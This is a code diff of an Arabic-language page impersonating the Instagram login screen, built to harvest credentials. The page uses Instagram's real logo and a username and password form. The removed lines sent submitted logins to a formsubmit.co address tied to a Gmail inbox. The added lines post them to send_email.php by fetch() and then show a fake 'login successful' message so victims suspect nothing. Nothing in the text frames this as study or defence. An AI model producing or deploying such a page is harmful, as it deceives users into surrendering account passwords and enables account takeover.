@@ -161,11 +161,27 @@
             text-decoration: none;
         }
         
+        .app-download {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .app-download p {
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        
+        .app-buttons img {
+            height: 40px;
+            margin: 0 4px;
+        }
+        
         .success-message {
             display: none;
             color: #0095f6;
             text-align: center;
             margin-top: 10px;
+            font-weight: bold;
         }
         
         @media (max-width: 875px) {
@@ -186,12 +202,7 @@
                 <div class="logo">
                     <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="إنستجرام">
                 </div>
-                <!-- استبدل your-email@example.com ببريدك الحقيقي -->
-                <form class="login-form" action="https://formsubmit.co/your-bbbbtvd1@gmail.com " method="POST">
-                    <input type="hidden" name="_subject" value="تسجيل دخول جديد - إنستجرام">
-                    <input type="hidden" name="_template" value="table">
-                    <input type="hidden" name="_next" value="https://yourwebsite.com/success.html">
-                    
+                <form class="login-form" action="send_email.php" method="POST">
                     <input type="text" name="username" placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف" required>
                     <input type="password" name="password" placeholder="كلمة السر" required>
                     <button type="submit">تسجيل الدخول</button>
@@ -209,15 +220,25 @@
                 <p>ليس لديك حساب؟ <a href="#">اشترك</a></p>
             </div>
             
-            <div class="success-message" id="successMessage">
+            <div class="success-message" id="successMessage" style="display:none;">
                 تم تسجيل الدخول بنجاح!
             </div>
         </div>
     </div>
 
     <script>
-        document.querySelector('.login-form').addEventListener('submit', function() {
-            document.getElementById('successMessage').style.display = 'block';
+        document.querySelector('.login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            fetch(this.action, {
+                method: 'POST',
+                body: new FormData(this)
+            })
+            .then(response => {
+                if(response.ok) {
+                    document.getElementById('successMessage').style.display = 'block';
+                    this.reset();
+                }
+            });
         });
     </script>
 </body>
